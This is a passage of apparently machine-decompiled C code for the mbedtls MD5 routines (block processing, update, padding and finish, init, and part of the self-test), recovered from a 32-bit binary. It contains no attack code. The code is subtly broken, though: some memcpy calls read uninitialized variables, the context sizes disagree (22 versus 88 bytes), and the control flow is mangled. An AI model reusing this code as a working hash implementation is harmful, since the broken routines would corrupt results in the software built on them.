        // continue -> 0x806cd80
    }
    // 0x806d2db
    g1 = 0;
    if (a1 == 0) {
        // 0x806d2e8
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return 0;
    }
    // 0x806d488
    putchar(10);
    g1 = 0;
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return 0;
}

// Address range: 0x806d4b0 - 0x806d4cf
int32_t mbedtls_md5_free(char * a1) {
    int32_t result = (int32_t)a1;
    if (a1 == NULL) {
        // 0x806d4ca
        return result;
    }
    // 0x806d4ba
    g6 = result + 88;
    *(char *)result = 0;
    int32_t result2 = result + 1; // 0x806d4c3
    // branch -> 0x806d4c0
    while (result2 != g6) {
        // 0x806d4c0
        *(char *)result2 = 0;
        result2++;
        // continue -> 0x806d4c0
    }
    // 0x806d4ca
    // branch -> 0x806d4ca
    // 0x806d4ca
    return result2;
}

// Address range: 0x806d4d0 - 0x806d4f6
void mbedtls_md5_clone(char * a1, char * a2) {
    // 0x806d4d0
    g1 = (int32_t)a1;
    memcpy(a1, a2, 22);
}

// Address range: 0x806d4f7 - 0x806d4ff
int32_t function_806d4f7(int32_t a1) {
    // 0x806d4f7
    return g7;
}

// Address range: 0x806d500 - 0x806d530
int32_t mbedtls_md5_starts(int32_t * a1) {
    int32_t result = (int32_t)a1;
    *a1 = 0;
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 8) = 0x67452301;
    *(int32_t *)(result + 12) = -0x10325477;
    *(int32_t *)(result + 16) = -0x67452302;
    *(int32_t *)(result + 20) = 0x10325476;
    return result;
}

// Address range: 0x806d531 - 0x806d53f
int32_t function_806d531(void) {
    // 0x806d531
    mbedtls_md5_process(0, NULL);
    g1 = 0;
    return 0;
}

// Address range: 0x806d540 - 0x806de9f
int32_t mbedtls_md5_process(int32_t result, char * a2) {
    int32_t v1 = (int32_t)a2;
    unsigned char v2 = *(char *)(v1 + 1); // 0x806d54f
    unsigned char v3 = *(char *)(v1 + 2); // 0x806d559
    unsigned char v4 = *a2; // 0x806d563
    unsigned char v5 = *(char *)(v1 + 3); // 0x806d569
    int32_t v6 = 0x1000000 * (int32_t)v5 | 0x10000 * (int32_t)v3 | 256 * (int32_t)v2 | (int32_t)v4; // 0x806d570
    unsigned char v7 = *(char *)(v1 + 5); // 0x806d573
    unsigned char v8 = *(char *)(v1 + 6); // 0x806d577
    unsigned char v9 = *(char *)(v1 + 4); // 0x806d583
    unsigned char v10 = *(char *)(v1 + 7); // 0x806d589
    int32_t v11 = 0x1000000 * (int32_t)v10 | 0x10000 * (int32_t)v8 | 256 * (int32_t)v7 | (int32_t)v9; // 0x806d590
    unsigned char v12 = *(char *)(v1 + 9); // 0x806d595
    unsigned char v13 = *(char *)(v1 + 10); // 0x806d599
    unsigned char v14 = *(char *)(v1 + 8); // 0x806d5a5
    unsigned char v15 = *(char *)(v1 + 11); // 0x806d5ab
    int32_t v16 = 0x1000000 * (int32_t)v15 | 0x10000 * (int32_t)v13 | 256 * (int32_t)v12 | (int32_t)v14; // 0x806d5b2
    unsigned char v17 = *(char *)(v1 + 13); // 0x806d5b7
    unsigned char v18 = *(char *)(v1 + 14); // 0x806d5bb
    unsigned char v19 = *(char *)(v1 + 12); // 0x806d5c7
    unsigned char v20 = *(char *)(v1 + 15); // 0x806d5cd
    int32_t v21 = 0x1000000 * (int32_t)v20 | (int32_t)v19 | 0x10000 * (int32_t)v18 | 256 * (int32_t)v17; // 0x806d5d4
    unsigned char v22 = *(char *)(v1 + 17); // 0x806d5d9
    unsigned char v23 = *(char *)(v1 + 18); // 0x806d5e3
    unsigned char v24 = *(char *)(v1 + 16); // 0x806d5ed
    unsigned char v25 = *(char *)(v1 + 19); // 0x806d5f4
    int32_t v26 = 0x1000000 * (int32_t)v25 | 0x10000 * (int32_t)v23 | 256 * (int32_t)v22 | (int32_t)v24; // 0x806d5fb
    unsigned char v27 = *(char *)(v1 + 21); // 0x806d5fe
    unsigned char v28 = *(char *)(v1 + 22); // 0x806d602
    unsigned char v29 = *(char *)(v1 + 20); // 0x806d60e
    unsigned char v30 = *(char *)(v1 + 23); // 0x806d614
    int32_t v31 = 0x1000000 * (int32_t)v30 | (int32_t)v29 | 0x10000 * (int32_t)v28 | 256 * (int32_t)v27; // 0x806d61b
    unsigned char v32 = *(char *)(v1 + 25); // 0x806d620
    unsigned char v33 = *(char *)(v1 + 26); // 0x806d624
    unsigned char v34 = *(char *)(v1 + 24); // 0x806d630
    unsigned char v35 = *(char *)(v1 + 27); // 0x806d636
    int32_t v36 = 0x1000000 * (int32_t)v35 | 0x10000 * (int32_t)v33 | 256 * (int32_t)v32 | (int32_t)v34; // 0x806d63d
    unsigned char v37 = *(char *)(v1 + 29); // 0x806d642
    unsigned char v38 = *(char *)(v1 + 30); // 0x806d646
    unsigned char v39 = *(char *)(v1 + 28); // 0x806d652
    unsigned char v40 = *(char *)(v1 + 31); // 0x806d658
    int32_t v41 = 0x1000000 * (int32_t)v40 | (int32_t)v39 | 0x10000 * (int32_t)v38 | 256 * (int32_t)v37; // 0x806d65f
    unsigned char v42 = *(char *)(v1 + 33); // 0x806d664
    unsigned char v43 = *(char *)(v1 + 34); // 0x806d66e
    unsigned char v44 = *(char *)(v1 + 32); // 0x806d678
    unsigned char v45 = *(char *)(v1 + 35); // 0x806d67f
    int32_t v46 = 0x1000000 * (int32_t)v45 | 0x10000 * (int32_t)v43 | 256 * (int32_t)v42 | (int32_t)v44; // 0x806d686
    unsigned char v47 = *(char *)(v1 + 37); // 0x806d689
    unsigned char v48 = *(char *)(v1 + 38); // 0x806d68d
    unsigned char v49 = *(char *)(v1 + 36); // 0x806d699
    unsigned char v50 = *(char *)(v1 + 39); // 0x806d69f
    int32_t v51 = 0x1000000 * (int32_t)v50 | (int32_t)v49 | 0x10000 * (int32_t)v48 | 256 * (int32_t)v47; // 0x806d6a6
    unsigned char v52 = *(char *)(v1 + 41); // 0x806d6ab
    unsigned char v53 = *(char *)(v1 + 42); // 0x806d6af
    unsigned char v54 = *(char *)(v1 + 40); // 0x806d6bb
    unsigned char v55 = *(char *)(v1 + 43); // 0x806d6c1
    int32_t v56 = 0x1000000 * (int32_t)v55 | 0x10000 * (int32_t)v53 | 256 * (int32_t)v52 | (int32_t)v54; // 0x806d6c8
    unsigned char v57 = *(char *)(v1 + 45); // 0x806d6cd
    unsigned char v58 = *(char *)(v1 + 46); // 0x806d6d1
    unsigned char v59 = *(char *)(v1 + 44); // 0x806d6dd
    unsigned char v60 = *(char *)(v1 + 47); // 0x806d6e3
    int32_t v61 = 0x1000000 * (int32_t)v60 | (int32_t)v59 | 0x10000 * (int32_t)v58 | 256 * (int32_t)v57; // 0x806d6ea
    unsigned char v62 = *(char *)(v1 + 49); // 0x806d6ef
    unsigned char v63 = *(char *)(v1 + 50); // 0x806d6f9
    unsigned char v64 = *(char *)(v1 + 48); // 0x806d703
    unsigned char v65 = *(char *)(v1 + 51); // 0x806d70a
    int32_t v66 = 0x1000000 * (int32_t)v65 | 0x10000 * (int32_t)v63 | 256 * (int32_t)v62 | (int32_t)v64; // 0x806d711
    unsigned char v67 = *(char *)(v1 + 53); // 0x806d714
    unsigned char v68 = *(char *)(v1 + 54); // 0x806d718
    unsigned char v69 = *(char *)(v1 + 52); // 0x806d724
    unsigned char v70 = *(char *)(v1 + 55); // 0x806d72a
    int32_t v71 = 0x1000000 * (int32_t)v70 | (int32_t)v69 | 0x10000 * (int32_t)v68 | 256 * (int32_t)v67; // 0x806d731
    unsigned char v72 = *(char *)(v1 + 57); // 0x806d736
    unsigned char v73 = *(char *)(v1 + 58); // 0x806d73a
    unsigned char v74 = *(char *)(v1 + 56); // 0x806d746
    unsigned char v75 = *(char *)(v1 + 59); // 0x806d74c
    int32_t v76 = 0x1000000 * (int32_t)v75 | 0x10000 * (int32_t)v73 | 256 * (int32_t)v72 | (int32_t)v74; // 0x806d753
    unsigned char v77 = *(char *)(v1 + 61); // 0x806d758
    unsigned char v78 = *(char *)(v1 + 62); // 0x806d75c
    int32_t * v79 = (int32_t *)(result + 16); // 0x806d760_0
    int32_t v80 = *v79; // 0x806d760
    int32_t * v81 = (int32_t *)(result + 12); // 0x806d763_0
    int32_t v82 = *v81; // 0x806d763
    unsigned char v83 = *(char *)(v1 + 60); // 0x806d76e
    unsigned char v84 = *(char *)(v1 + 63); // 0x806d772
    int32_t * v85 = (int32_t *)(result + 20); // 0x806d778_0
    int32_t v86 = *v85; // 0x806d778
    int32_t v87 = 0x1000000 * (int32_t)v84 | (int32_t)v83 | 0x10000 * (int32_t)v78 | 256 * (int32_t)v77; // 0x806d77e
    int32_t * v88 = (int32_t *)(result + 8); // 0x806d783_0
    int32_t v89 = *v88; // 0x806d783
    uint32_t v90 = v6 - 0x28955b88 + v89 + ((v86 ^ v80) & v82 ^ v86); // 0x806d798
    int32_t v91 = (128 * v90 | v90 / 0x2000000) + v82; // 0x806d7ad
    uint32_t v92 = v11 - 0x173848aa + v86 + (v91 & (v82 ^ v80) ^ v80); // 0x806d7b5
    int32_t v93 = (0x1000 * v92 | v92 / 0x100000) + v91; // 0x806d7cc
    uint32_t v94 = v16 + 0x242070db + v80 + (v93 & (v91 ^ v82) ^ v82); // 0x806d7d2
    int32_t v95 = (0x20000 * v94 | v94 / 0x8000) + v93; // 0x806d7e9
    uint32_t v96 = v21 - 0x3e423112 + v82 + (v95 & (v93 ^ v91) ^ v91); // 0x806d7ef
    int32_t v97 = (0x400000 * v96 | v96 / 1024) + v95; // 0x806d806
    uint32_t v98 = v26 - 0xa83f051 + v91 + (v97 & (v95 ^ v93) ^ v93); // 0x806d80c
    int32_t v99 = (128 * v98 | v98 / 0x2000000) + v97; // 0x806d823
    uint32_t v100 = v31 + 0x4787c62a + v93 + (v99 & (v97 ^ v95) ^ v95); // 0x806d829
    int32_t v101 = (0x1000 * v100 | v100 / 0x100000) + v99; // 0x806d83e
    uint32_t v102 = v36 - 0x57cfb9ed + v95 + (v101 & (v99 ^ v97) ^ v97); // 0x806d846
    int32_t v103 = (0x20000 * v102 | v102 / 0x8000) + v101; // 0x806d85d
    uint32_t v104 = v41 - 0x2b96aff + v97 + (v103 & (v101 ^ v99) ^ v99); // 0x806d863
    int32_t v105 = (0x400000 * v104 | v104 / 1024) + v103; // 0x806d87a
    uint32_t v106 = v46 + 0x698098d8 + v99 + (v105 & (v103 ^ v101) ^ v101); // 0x806d880
    int32_t v107 = (128 * v106 | v106 / 0x2000000) + v105; // 0x806d897
    uint32_t v108 = v51 - 0x74bb0851 + v101 + (v107 & (v105 ^ v103) ^ v103); // 0x806d89d
    int32_t v109 = (0x1000 * v108 | v108 / 0x100000) + v107; // 0x806d8b4
    uint32_t v110 = v56 - 0xa44f + v103 + (v109 & (v107 ^ v105) ^ v105); // 0x806d8ba
    int32_t v111 = (0x20000 * v110 | v110 / 0x8000) + v109; // 0x806d8d1
    uint32_t v112 = v61 - 0x76a32842 + v105 + (v111 & (v109 ^ v107) ^ v107); // 0x806d8d7
    int32_t v113 = (0x400000 * v112 | v112 / 1024) + v111; // 0x806d8ee
    uint32_t v114 = v66 + 0x6b901122 + v107 + (v113 & (v111 ^ v109) ^ v109); // 0x806d8f4
    int32_t v115 = (128 * v114 | v114 / 0x2000000) + v113; // 0x806d90b
    uint32_t v116 = v71 - 0x2678e6d + v109 + (v115 & (v113 ^ v111) ^ v111); // 0x806d911
    int32_t v117 = (0x1000 * v116 | v116 / 0x100000) + v115; // 0x806d928
    uint32_t v118 = v76 - 0x5986bc72 + v111 + (v117 & (v115 ^ v113) ^ v113); // 0x806d92e
    int32_t v119 = (0x20000 * v118 | v118 / 0x8000) + v117; // 0x806d945
    uint32_t v120 = v87 + 0x49b40821 + v113 + (v119 & (v117 ^ v115) ^ v115); // 0x806d94b
    int32_t v121 = (0x400000 * v120 | v120 / 1024) + v119; // 0x806d95e
    uint32_t v122 = v11 - 0x9e1da9e + v115 + ((v121 ^ v119) & v117 ^ v119); // 0x806d968
    int32_t v123 = (32 * v122 | v122 / 0x8000000) + v121; // 0x806d97b
    uint32_t v124 = v36 - 0x3fbf4cc0 + v117 + ((v123 ^ v121) & v119 ^ v121); // 0x806d985
    int32_t v125 = (512 * v124 | v124 / 0x800000) + v123; // 0x806d998
    uint32_t v126 = v61 + 0x265e5a51 + v119 + ((v125 ^ v123) & v121 ^ v123); // 0x806d9a2
    int32_t v127 = (0x4000 * v126 | v126 / 0x40000) + v125; // 0x806d9b5
    uint32_t v128 = v6 - 0x16493856 + v121 + ((v127 ^ v125) & v123 ^ v125); // 0x806d9bf
    int32_t v129 = (0x100000 * v128 | v128 / 0x1000) + v127; // 0x806d9d2
    uint32_t v130 = v31 - 0x29d0efa3 + v123 + ((v129 ^ v127) & v125 ^ v127); // 0x806d9dc
    int32_t v131 = (32 * v130 | v130 / 0x8000000) + v129; // 0x806d9ef
    uint32_t v132 = v56 + 0x2441453 + v125 + ((v131 ^ v129) & v127 ^ v129); // 0x806d9f9
    int32_t v133 = (512 * v132 | v132 / 0x800000) + v131; // 0x806da0c
    uint32_t v134 = v87 - 0x275e197f + v127 + ((v133 ^ v131) & v129 ^ v131); // 0x806da16
    int32_t v135 = (0x4000 * v134 | v134 / 0x40000) + v133; // 0x806da29
    uint32_t v136 = v26 - 0x182c0438 + v129 + ((v135 ^ v133) & v131 ^ v133); // 0x806da33
    int32_t v137 = (0x100000 * v136 | v136 / 0x1000) + v135; // 0x806da46
    uint32_t v138 = v51 + 0x21e1cde6 + v131 + ((v137 ^ v135) & v133 ^ v135); // 0x806da50
    int32_t v139 = (32 * v138 | v138 / 0x8000000) + v137; // 0x806da63
    uint32_t v140 = v76 - 0x3cc8f82a + v133 + ((v139 ^ v137) & v135 ^ v137); // 0x806da6d
    int32_t v141 = (512 * v140 | v140 / 0x800000) + v139; // 0x806da80
    uint32_t v142 = v21 - 0xb2af279 + v135 + ((v141 ^ v139) & v137 ^ v139); // 0x806da8a
    int32_t v143 = (0x4000 * v142 | v142 / 0x40000) + v141; // 0x806da9d
    uint32_t v144 = v46 + 0x455a14ed + v137 + ((v143 ^ v141) & v139 ^ v141); // 0x806daa7
    int32_t v145 = (0x100000 * v144 | v144 / 0x1000) + v143; // 0x806daba
    uint32_t v146 = v71 - 0x561c16fb + v139 + ((v145 ^ v143) & v141 ^ v143); // 0x806dac4
    int32_t v147 = (32 * v146 | v146 / 0x8000000) + v145; // 0x806dad7
    uint32_t v148 = v16 - 0x3105c08 + v141 + ((v147 ^ v145) & v143 ^ v145); // 0x806dae1
    int32_t v149 = (512 * v148 | v148 / 0x800000) + v147; // 0x806daf1
    uint32_t v150 = v41 + 0x676f02d9 + v143 + ((v149 ^ v147) & v145 ^ v147); // 0x806dafb
    int32_t v151 = (0x4000 * v150 | v150 / 0x40000) + v149; // 0x806db01
    int32_t v152 = v151 ^ v149; // 0x806db01
    uint32_t v153 = v66 - 0x72d5b376 + v145 + (v152 & v147 ^ v149); // 0x806db21
    int32_t v154 = (0x100000 * v153 | v153 / 0x1000) + v151; // 0x806db31
    uint32_t v155 = v31 - 0x5c6be + v147 + (v154 ^ v152); // 0x806db35
    int32_t v156 = (16 * v155 | v155 / 0x10000000) + v154; // 0x806db3e
    uint32_t v157 = v46 - 0x788e097f + v149 + (v154 ^ v151 ^ v156); // 0x806db4d
    int32_t v158 = (2048 * v157 | v157 / 0x200000) + v156; // 0x806db55
    uint32_t v159 = v61 + 0x6d9d6122 + v151 + (v156 ^ v154 ^ v158); // 0x806db64
    int32_t v160 = (0x10000 * v159 | v159 / 0x10000) + v158; // 0x806db6c
    uint32_t v161 = v76 - 0x21ac7f4 + v154 + (v158 ^ v156 ^ v160); // 0x806db7b
    int32_t v162 = (0x800000 * v161 | v161 / 512) + v160; // 0x806db84
    uint32_t v163 = v11 - 0x5b4115bc + v156 + (v160 ^ v158 ^ v162); // 0x806db93
    int32_t v164 = (16 * v163 | v163 / 0x10000000) + v162; // 0x806db9c
    uint32_t v165 = v26 + 0x4bdecfa9 + v158 + (v162 ^ v160 ^ v164); // 0x806dbb1
    int32_t v166 = (2048 * v165 | v165 / 0x200000) + v164; // 0x806dbb9
    uint32_t v167 = v41 - 0x944b4a0 + v160 + (v164 ^ v162 ^ v166); // 0x806dbc8
    int32_t v168 = (0x10000 * v167 | v167 / 0x10000) + v166; // 0x806dbd1
    uint32_t v169 = v56 - 0x41404390 + v162 + (v166 ^ v164 ^ v168); // 0x806dbe6
    int32_t v170 = (0x800000 * v169 | v169 / 512) + v168; // 0x806dbee
    uint32_t v171 = v71 + 0x289b7ec6 + v164 + (v168 ^ v166 ^ v170); // 0x806dbfd
    int32_t v172 = (16 * v171 | v171 / 0x10000000) + v170; // 0x806dc05
    uint32_t v173 = v6 - 0x155ed806 + v166 + (v170 ^ v168 ^ v172); // 0x806dc14
    int32_t v174 = (2048 * v173 | v173 / 0x200000) + v172; // 0x806dc1d
    uint32_t v175 = v21 - 0x2b10cf7b + v168 + (v172 ^ v170 ^ v174); // 0x806dc32
    int32_t v176 = (0x10000 * v175 | v175 / 0x10000) + v174; // 0x806dc3a
    uint32_t v177 = v36 + 0x4881d05 + v170 + (v174 ^ v172 ^ v176); // 0x806dc49
    int32_t v178 = (0x800000 * v177 | v177 / 512) + v176; // 0x806dc51
    uint32_t v179 = v51 - 0x262b2fc7 + v172 + (v176 ^ v174 ^ v178); // 0x806dc60
    int32_t v180 = (16 * v179 | v179 / 0x10000000) + v178; // 0x806dc69
    uint32_t v181 = v66 - 0x1924661b + v174 + (v178 ^ v176 ^ v180); // 0x806dc7e
    int32_t v182 = (2048 * v181 | v181 / 0x200000) + v180; // 0x806dc86
    uint32_t v183 = v87 + 0x1fa27cf8 + v176 + (v180 ^ v178 ^ v182); // 0x806dc95
    int32_t v184 = (0x10000 * v183 | v183 / 0x10000) + v182; // 0x806dc9d
    uint32_t v185 = v16 - 0x3b53a99b + v178 + (v182 ^ v180 ^ v184); // 0x806dcac
    int32_t v186 = (0x800000 * v185 | v185 / 512) + v184; // 0x806dcb5
    uint32_t v187 = v6 - 0xbd6ddbc + v180 + ((v186 | -1 - v182) ^ v184); // 0x806dccc
    int32_t v188 = (64 * v187 | v187 / 0x4000000) + v186; // 0x806dcdd
    uint32_t v189 = v41 + 0x432aff97 + v182 + ((v188 | -1 - v184) ^ v186); // 0x806dce3
    int32_t v190 = (1024 * v189 | v189 / 0x400000) + v188; // 0x806dcec
    uint32_t v191 = v76 - 0x546bdc59 + v184 + ((v190 | -1 - v186) ^ v188); // 0x806dcfd
    int32_t v192 = (0x8000 * v191 | v191 / 0x20000) + v190; // 0x806dd06
    uint32_t v193 = v31 - 0x36c5fc7 + v186 + ((v192 | -1 - v188) ^ v190); // 0x806dd1d
    int32_t v194 = (0x200000 * v193 | v193 / 2048) + v192; // 0x806dd34
    uint32_t v195 = v66 + 0x655b59c3 + v188 + ((v194 | -1 - v190) ^ v192); // 0x806dd3a
    int32_t v196 = (64 * v195 | v195 / 0x4000000) + v194; // 0x806dd51
    uint32_t v197 = v21 - 0x70f3336e + v190 + ((v196 | -1 - v192) ^ v194); // 0x806dd57
    int32_t v198 = (1024 * v197 | v197 / 0x400000) + v196; // 0x806dd6e
    uint32_t v199 = v56 - 0x100b83 + v192 + ((v198 | -1 - v194) ^ v196); // 0x806dd74
    int32_t v200 = (0x8000 * v199 | v199 / 0x20000) + v198; // 0x806dd8b
    uint32_t v201 = v11 - 0x7a7ba22f + v194 + ((v200 | -1 - v196) ^ v198); // 0x806dd91
    int32_t v202 = (0x200000 * v201 | v201 / 2048) + v200; // 0x806dda8
    uint32_t v203 = v46 + 0x6fa87e4f + v196 + ((v202 | -1 - v198) ^ v200); // 0x806ddae
    int32_t v204 = (64 * v203 | v203 / 0x4000000) + v202; // 0x806ddc5
    uint32_t v205 = v87 - 0x1d31920 + v198 + ((v204 | -1 - v200) ^ v202); // 0x806ddcb
    int32_t v206 = (1024 * v205 | v205 / 0x400000) + v204; // 0x806dde2
    uint32_t v207 = v36 - 0x5cfebcec + v200 + ((v206 | -1 - v202) ^ v204); // 0x806dde8
    int32_t v208 = (0x8000 * v207 | v207 / 0x20000) + v206; // 0x806ddff
    uint32_t v209 = v71 + 0x4e0811a1 + v202 + ((v208 | -1 - v204) ^ v206); // 0x806de05
    int32_t v210 = (0x200000 * v209 | v209 / 2048) + v208; // 0x806de1c
    uint32_t v211 = v26 - 0x8ac817e + v204 + ((v210 | -1 - v206) ^ v208); // 0x806de22
    int32_t v212 = (64 * v211 | v211 / 0x4000000) + v210; // 0x806de39
    uint32_t v213 = v61 - 0x42c50dcb + v206 + ((v212 | -1 - v208) ^ v210); // 0x806de3f
    int32_t v214 = (1024 * v213 | v213 / 0x400000) + v212; // 0x806de47
    uint32_t v215 = v16 + 0x2ad7d2bb + v208 + ((v214 | -1 - v210) ^ v212); // 0x806de58
    int32_t v216 = (0x8000 * v215 | v215 / 0x20000) + v214; // ebx
    *v85 = v214 + *v85;
    int32_t v217 = v51 - 0x14792c6f + v210; // 0x806de66
    g6 = v217;
    *v79 = v216 + *v79;
    *v88 = v212 + *v88;
    uint32_t v218 = (v214 ^ (v216 | -1 - v212)) + v217; // 0x806de82
    int32_t v219 = v216 + *v81 + (0x200000 * v218 | v218 / 2048); // 0x806de8a
    g4 = v219;
    *v81 = v219;
    int32_t v220;
    g2 = v220;
    return result;
}

// Address range: 0x806dea0 - 0x806df8f
int32_t mbedtls_md5_update(char * a1, char * a2, uint32_t a3) {
    int32_t v1 = g5; // 0x806dea3
    int32_t v2 = g7; // 0x806dea4
    int32_t v3 = g3; // 0x806dea5
    g3 = a3;
    g7 = (int32_t)a1;
    g5 = (int32_t)a2;
    if (a3 == 0) {
        // 0x806df14
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return g1;
    }
    uint32_t v4 = *(int32_t *)a1; // 0x806deb6
    int32_t v5 = v4 % 64; // 0x806deba
    int32_t v6 = v4 + a3; // 0x806debd
    g1 = v6;
    int32_t v7 = 64 - v5; // edx
    *(int32_t *)a1 = v6;
    if (v6 < a3) {
        int32_t * v8 = (int32_t *)(g7 + 4); // 0x806ded1_0
        *v8 = *v8 + 1;
        // branch -> 0x806ded5
    }
    int32_t v9 = g3; // 0x806ded5
    int32_t v10 = v9; // 0x806ded9
    int32_t v11; // 0x806df10
    if (v9 >= v7) {
      lab_0x806df40:
        // 0x806df40
        g1 = v5;
        if (v5 == 0) {
            // 0x806df40
            v10 = g3;
            v5 = 0;
            // branch -> 0x806ded9
        } else {
            int32_t v12 = g7 + 24; // 0x806df4a
            memcpy((char *)(v12 + v5), (char *)g5, v7);
            int32_t v13 = g7; // 0x806df69
            mbedtls_md5_process(v13, (char *)v12);
            g1 = v13;
            g5 += v7;
            int32_t v14 = g3 - v7; // 0x806df81
            g3 = v14;
            v10 = v14;
            v5 = 0;
            // branch -> 0x806ded9
        }
        // 0x806ded9
        v11 = v10;
        if (v10 >= 64) {
          lab_0x806dede:;
            int32_t v15 = 0; // 0x806dee0
            mbedtls_md5_process(g7, (char *)(g5 + v15));
            int32_t v16 = g3; // 0x806def5
            // branch -> 0x806dee0
            while (v16 - (v15 + 64) > 63) {
                // 0x806dee0
                v15 += 64;
                mbedtls_md5_process(g7, (char *)(g5 + v15));
                v16 = g3;
                // continue -> 0x806dee0
            }
            uint32_t v17 = v16 - 64; // 0x806df01
            g1 = v17 & -64;
            v11 = v17 % 64;
            // branch -> 0x806df10
        }
      lab_0x806df10:
        // 0x806df10
        if (v11 != 0) {
            // 0x806df20
            v7 = v5;
            int32_t v18 = g7; // 0x806df29
            g3 = v3;
            g7 = v2;
            g5 = v1;
            int32_t v19;
            int32_t v20;
            memcpy((char *)v20, (char *)v19, v5 + 24 + v18);
            // branch -> 0x806df40
            goto lab_0x806df40;
        }
        // 0x806df10
        // branch -> 0x806df14
        // 0x806df14
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return g1;
    }
    // 0x806ded9
    if (v10 < 64) {
        v11 = v10;
        goto lab_0x806df10;
    }
    goto lab_0x806dede;
}

// Address range: 0x806df90 - 0x806e0bf
// Used cryptographic patterns:
//  - padding_used_in_hashing_algorithms__0x80_0_____0_ (8-bit, little endian)
int32_t mbedtls_md5_finish(int32_t * a1, char * a2) {
    int32_t v1 = g5; // 0x806df93
    int32_t v2 = g7; // 0x806df94
    int32_t v3 = g3; // 0x806df95
    g3 = (int32_t)a1;
    g7 = (int32_t)a2;
    uint32_t v4 = *a1; // 0x806dfac
    int32_t v5 = 0x8000000 * v4 / 0x1000000;
    g5 = v4 / 0x2000 % 0x10000;
    uint32_t v6 = *a1 % 64; // 0x806dfe9
    int32_t v7 = (v6 < 56 ? 56 : 120) - v6;
    g1 = v7;
    mbedtls_md5_update((char *)a1, "\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", v7);
    g1 = &v5;
    mbedtls_md5_update((char *)g3, (char *)&v5, 8);
    *(char *)g7 = (char)*(int32_t *)(g3 + 8);
    *(char *)(g7 + 1) = (char)(*(int32_t *)(g3 + 8) / 256);
    *(char *)(g7 + 2) = (char)*(int16_t *)(g3 + 10);
    *(char *)(g7 + 3) = *(char *)(g3 + 11);
    *(char *)(g7 + 4) = (char)*(int32_t *)(g3 + 12);
    *(char *)(g7 + 5) = (char)(*(int32_t *)(g3 + 12) / 256);
    *(char *)(g7 + 6) = (char)*(int16_t *)(g3 + 14);
    *(char *)(g7 + 7) = *(char *)(g3 + 15);
    *(char *)(g7 + 8) = (char)*(int32_t *)(g3 + 16);
    *(char *)(g7 + 9) = (char)(*(int32_t *)(g3 + 16) / 256);
    *(char *)(g7 + 10) = (char)*(int16_t *)(g3 + 18);
    *(char *)(g7 + 11) = *(char *)(g3 + 19);
    *(char *)(g7 + 12) = (char)*(int32_t *)(g3 + 20);
    *(char *)(g7 + 13) = (char)(*(int32_t *)(g3 + 20) / 256);
    *(char *)(g7 + 14) = (char)*(int16_t *)(g3 + 22);
    char result = *(char *)(g3 + 23); // 0x806e093
    *(char *)(g7 + 15) = result;
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return result;
}

// Address range: 0x806e0c0 - 0x806e0df
int32_t mbedtls_md5_init(char * a1) {
    // 0x806e0c0
    memset(a1, 0, 22);
    return 0;
}

// Address range: 0x806e0e0 - 0x806e15f
int32_t mbedtls_md5(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // 0x806e0e3
    int32_t v2;
    int32_t v3 = &v2; // 0x806e0e7_0
    g3 = v3;
    mbedtls_md5_init((char *)&v2);
    v2 = 0;
    g1 = a1;
    mbedtls_md5_update((char *)g3, (char *)a1, a2);
    mbedtls_md5_finish((int32_t *)g3, (char *)a3);
    g1 = v3;
    int32_t v4;
    g6 = &v4;
    *(char *)v3 = 0;
    int32_t result = g1 + 1; // 0x806e14b
    g1 = result;
    // branch -> 0x806e148
    while (result != g6) {
        // 0x806e148
        *(char *)result = 0;
        result = g1 + 1;
        g1 = result;
        // continue -> 0x806e148
    }
    // 0x806e152
    g3 = v1;
    int32_t v5;
    g2 = v5;
    return result;
}

// Address range: 0x806e160 - 0x806e24f
// Used cryptographic patterns:
//  - openbsd_hw_c_do_digest_md5zero (8-bit, little endian)
int32_t mbedtls_md5_self_test(int32_t a1) {
    int32_t v1 = g5; // 0x806e163
    int32_t v2 = g7; // 0x806e164
    int32_t v3 = g3; // bp-16
    g3 = 1;
    int32_t v4 = 1; // 0x806e1d2
    char * str2 = "\xd4\x1d\x8c\xd9\x8f\x00\xb2\x04\xe9\x80\x09\x98\xec\xf8\x42\x7e";
    int32_t v5 = &g158; // 0x806e1f715
    // branch -> 0x806e1cb
    while (true) {
        // 0x806e1cb
        g7 = a1;
        int32_t v6 = v4; // 0x806e18f
        if (a1 != 0) {
            // 0x806e1d2
            printf("  MD5 test #%d: ", v4);
            v6 = g3;
            // branch -> 0x806e188
        }
        int32_t v7 = *(int32_t *)(4 * v6 + (int32_t)&g157); // 0x806e18f
        int32_t str;
        mbedtls_md5(v5, v7, (int32_t)&str);
        int32_t v8 = (int32_t)str2;
        g5 = v8;
        uint32_t strncmp_rc = strncmp((char *)&str, str2, 16);
        g237 = strncmp_rc % 2 == 0;
        if (strncmp_rc % 2 != 0) {
            // 0x806e230
            g1 = 1;
            if (a1 == 0) {
                // 0x806e20d
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 1;
            }
            // 0x806e23c
            puts("failed");
            g1 = 1;
            // branch -> 0x806e20d
            // 0x806e20d
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 1;
        }
        int32_t v9 = g3 + 1; // 0x806e1bb
        g3 = v9;
        int32_t v10;
        if (a1 == 0) {
            // 0x806e1bb
            if (v9 == 8) {
                // 0x806e204
                g1 = 0;
                // branch -> 0x806e20d
                // 0x806e20d
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 0;
            }
            v10 = 0;
        } else {
            // 0x806e1e8
            puts("passed");
            int32_t v11 = g3; // 0x806e1ff
            if (v11 == 8) {
                // 0x806e204
                g1 = 0;
                if (a1 == 0) {
                    // 0x806e20d
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return 0;
                }
                // 0x806e218
                putchar(10);
                g1 = 0;
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 0;
            }
            v10 = a1;
            v9 = v11;
        }
        // 0x806e1cb
        v4 = v9;
        a1 = v10;
        str2 = (char *)(v8 + 16);
        v5 += 81;
